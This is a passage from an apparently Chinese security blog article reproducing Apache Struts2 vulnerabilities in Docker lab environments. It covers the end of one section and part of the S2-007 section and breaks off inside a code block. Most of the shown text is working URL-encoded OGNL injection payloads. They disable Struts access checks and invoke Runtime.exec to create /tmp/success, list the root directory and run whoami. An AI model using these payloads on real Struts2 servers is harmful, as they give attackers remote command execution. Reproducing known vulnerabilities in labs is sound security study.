style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">5c</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">27</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">]%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">5cu003d</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">5cu0023vccc</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">27</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)(%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">5cu0023vccc</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">5cu003dnew</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">20java</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">lang</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Boolean</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">22false</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">22</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)))&amp;(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">asdf</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)((</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">'%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))'</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)(%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">5cu0023rt</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">5cu003d@java</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">lang</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Runtime@getRuntime</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">()))=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">1</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.8048780487804879" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/8_BSZPsRnWaHgZPriaZ8fKicEE7vGS8A.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wDkxqmsD2poFf1P5k7INKZkAVZ3BSZPsRnWaHgZPriaZ8fKicEE7vGS8A/640?wx_fmt=png'" data-type="png" data-w="984" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">进入docker容器查看，在tmp目录下已经创建了success文件</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.23667377398720682" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/9_aMkUOY2aFc6JN2ndianpSE35ZqiaNg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wCuIK2NAToGm0ibCId2kPpsVgF29iaMkUOY2aFc6JN2ndianpSE35ZqiaNg/640?wx_fmt=png'" data-type="png" data-w="469" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><h1 style="margin: 2em auto 1em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 1em;padding-left: 1em;border-bottom: 2px solid rgb(15, 76, 129);">S2-007</h1><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">在s2-007页面的文本框中，age来自于用户输入，传递一个非整数给id导致错误，struts会将用户的输入当作ongl表达式执行，从而导致了漏洞</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">进入s2-007的docker漏洞环境</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.22775119617224882" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/10_6WPvxUoJf4LqkvZuFdicJtlh8aZgFA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5w6JtCmYLD4BzF3JUVDoyF7UN1q6WPvxUoJf4LqkvZuFdicJtlh8aZgFA/640?wx_fmt=png'" data-type="png" data-w="1045" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">执行payload列出当前目录下的所有文件</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;;text-align: start;white-space: normal;"><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">27</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">+%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">2B</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">+%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">28</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">23</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">_memberAccess</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">5B</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">22allowStaticMethodAccess</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">22</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">5D</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">3Dtrue</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">2C</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">23foo</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">3Dnew</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">+</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">java</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">lang</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Boolean</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">28</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">22false</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">22</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">29</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">+%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">2C</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">23context</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">5B</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">22xwork</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">MethodAccessor</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">denyMethodExecution</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">22</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">5D</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">3D</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">23foo</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">2C</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">40org</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">apache</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">commons</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">io</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">IOUtils</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">40toString</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">28</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">40java</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">lang</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Runtime</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">40getRuntime</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">28</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">29.exec</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">28</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">27ls</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">20</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">27</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">29.getInputStream</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">28</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">29</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">29</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">29</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">+%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">2B</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">+%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">27</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.8048780487804879" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/11_cJniaLRNW1RVUZG6fQyN5aGTGFmLCg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5w2t7bXM46VWM4uibT4CDdNxncicibcJniaLRNW1RVUZG6fQyN5aGTGFmLCg/640?wx_fmt=png'" data-type="png" data-w="984" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">添加payload执行whoami</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;;text-align: start;white-space: normal;"><pre data-lang="java" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">27</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">+%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">2B</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">+%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">28</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">23</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">_memberAccess</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">5B</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">22allowStaticMethodAccess</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">22</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">5D</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">3Dtrue</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">2C</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">23foo</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">3Dnew</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">+</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">java</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">lang</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Boolean</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">28</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">22false</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">22</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">29</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">+%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">2C</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">23context</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">5B</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">22xwork</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">MethodAccessor</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">denyMethodExecution</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">22</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">5D</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">3D</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">23foo</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">2C</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">40org</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">apache</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">commons</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">io</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">IOUtils</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">40toString</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">28</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">40java</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">lang</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Runtime</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">40getRuntime</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">28</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">29.exec</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">28</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">27whoami</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">27</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">29.getInputStream</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">28</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">29</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span 